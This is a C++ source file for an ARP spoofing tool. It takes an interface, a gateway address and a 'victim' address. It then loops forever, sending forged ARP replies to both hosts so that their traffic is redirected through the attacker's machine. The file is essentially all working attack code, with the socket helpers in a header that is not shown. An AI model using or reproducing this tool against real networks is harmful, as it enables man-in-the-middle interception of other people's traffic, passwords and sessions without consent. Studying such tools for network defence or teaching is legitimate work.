#include <memory>
#include <stdexcept>

#include <unistd.h>

#include "arp_socket.hpp"

namespace {

    inline void print_usage(const char* const appName)
    {
        printf("Usage %s:"
               " -i<interface>"
               " -g<gateway-ip-addr>"
               " -t<victim-ip-addr>"
               " -r<retransmit-interval-in-seconds>"
               " [-h]\n"
               , appName);
    }
}

int main(int argc, char** argv)
{
    if (argc < 2) {
        return print_usage(argv[0]), 1;
    }

    int retransmitInterval = 2; // > retransmit interval is 2s by default

    char* interface = nullptr; // > The ethernet interface

    char* gatewayIpAddr = nullptr; // > Gateway
    char* victimIpAddr = nullptr; // > Victim

    for (int opt; (opt = ::getopt(argc, argv, "hi:g:t:r:")) != -1; )
    {
        switch (opt)
        {
            case 'h':
            {
                print_usage(argv[0]);
                return 0;
            }

            case 'g':
            {
                gatewayIpAddr = optarg;
                break;
            }

            case 't':
            {
                victimIpAddr = optarg;
                break;
            }

            case 'i':
            {
                interface = optarg;
                break;
            }

            case 'r':
            {
                retransmitInterval = ::atoi(optarg);
                break;
            }

            default: {
                return 1;
            }
        }
    }

    if (!interface) {
        return ::fprintf(stdout, "Interface not specified. Use -i xxxx"), 1;
    }

    if (!gatewayIpAddr) {
        return ::fprintf(stdout, "Gateway addres not specified. Use -g xxx.xxx.xxx.xxx"), 1;
    }

    if (!victimIpAddr) {
        return ::fprintf(stdout, "Target address not specified Use -t xxx.xxx.xxx.xxx"), 1;
    }

    std::shared_ptr<spoof::arp_socket> victim;
    std::shared_ptr<spoof::arp_socket> gateway;

    try
    {
        spoof::ip4_addr victimAddr;
        spoof::ip4_addr gatewayAddr;

        // Locate victim machine
        victimAddr = spoof::locate_ip4_addr(interface, victimIpAddr);
        gatewayAddr = spoof::locate_ip4_addr(interface, gatewayIpAddr);

        victim.reset(spoof::arp_socket::create_spoofed_gateway(interface, victimAddr, gatewayAddr.ip4));
        gateway.reset(spoof::arp_socket::create_spoofed_machine(interface, gatewayAddr, victimAddr.ip4));
    }

    catch (std::runtime_error& ex)
    {
        return ::perror(ex.what()), 1;
    }

    // Enter main program loop
    while (true)
    {
        gateway->send_reply();
        victim->send_reply();

        ::sleep(retransmitInterval); // > Sleep for the required interval before retransmitting
    }

    return 0;
}
